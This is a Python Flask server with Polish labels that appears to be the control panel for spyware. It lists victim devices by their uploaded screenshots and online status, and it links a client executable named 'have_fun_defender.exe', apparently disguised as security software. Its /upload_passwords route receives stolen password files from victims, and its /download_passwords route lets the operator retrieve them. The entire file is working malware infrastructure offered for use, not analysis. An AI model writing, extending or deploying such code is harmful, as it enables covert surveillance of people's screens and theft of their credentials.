from flask import Flask, request, send_file, jsonify, render_template_string, redirect, url_for
import os
import datetime
import json

app = Flask(__name__)
UPLOAD_FOLDER = "screens"
COMMAND_FOLDER = "commands"

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(COMMAND_FOLDER, exist_ok=True)

@app.route("/")
def index():
    users = sorted(os.listdir(UPLOAD_FOLDER))
    now = datetime.datetime.utcnow()
    device_list = []

    for u in users:
        folder = os.path.join(UPLOAD_FOLDER, u)
        files = sorted(os.listdir(folder))
        has_passwords = os.path.exists(os.path.join(folder, "passwords.dat"))

        if not files:
            device_list.append((u, "🔴", "brak plików", has_passwords))
            continue
        latest = files[-1]
        timestamp_str = latest.replace("screenshot_", "").replace(".png", "")
        try:
            timestamp = datetime.datetime.strptime(timestamp_str, "%Y-%m-%d_%H-%M-%S")
            timestamp += datetime.timedelta(hours=2)
            diff = (now - timestamp).total_seconds()
            if diff < 60:
                device_list.append((u, "🟢", timestamp.strftime("%H:%M:%S"), has_passwords))
            else:
                device_list.append((u, "🔴", timestamp.strftime("%H:%M:%S"), has_passwords))
        except:
            device_list.append((u, "🔴", "błąd daty", has_passwords))

    content = f"""
<h1>📦 Pobierz klienta</h1>
<p><a href="https://github.com/Crazy2515/zdalny-podglad/raw/main/client_download/have_fun_defender.exe" download>
⬇️ have_fun_defender.exe</a></p>
<h1>Urządzenia: {len(device_list)}</h1>
<ul>
"""

    for u, status, t, has_passwords in device_list:
        content += f'<li>{status} <a href="/view?user={u}">{u}</a> (ostatni screen: {t}) | <a href="/history?user={u}">Historia</a>'
        if has_passwords:
            content += f' | <a href="/download_passwords/{u}">🔐 Hasła</a>'
        content += '</li>'
    content += "</ul>"
    return content



@app.route("/upload_passwords", methods=['POST'])
def upload_passwords():
    try:
        user = request.form.get("user")
        if not user:
            return "Brak ID użytkownika", 400

        folder = os.path.join(UPLOAD_FOLDER, user)
        os.makedirs(folder, exist_ok=True)

        if 'data' not in request.files:
            return "Brak pliku 'data'", 400

        file = request.files['data']
        filepath = os.path.join(folder, "passwords.dat")
        file.save(filepath)

        with open(os.path.join(folder, "received_passwords.txt"), "w") as f:
            f.write(datetime.datetime.now().isoformat())

        return "OK"

    except Exception as e:
        return f"Błąd serwera: {str(e)}", 500

@app.route("/download_passwords/<user>")
def download_passwords(user):
    folder = os.path.join(UPLOAD_FOLDER, user)
    filepath = os.path.join(folder, "passwords.dat")
    if not os.path.exists(filepath):
        return "Plik nie istnieje", 404
    return send_file(filepath, as_attachment=True, download_name="passwords.dat")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

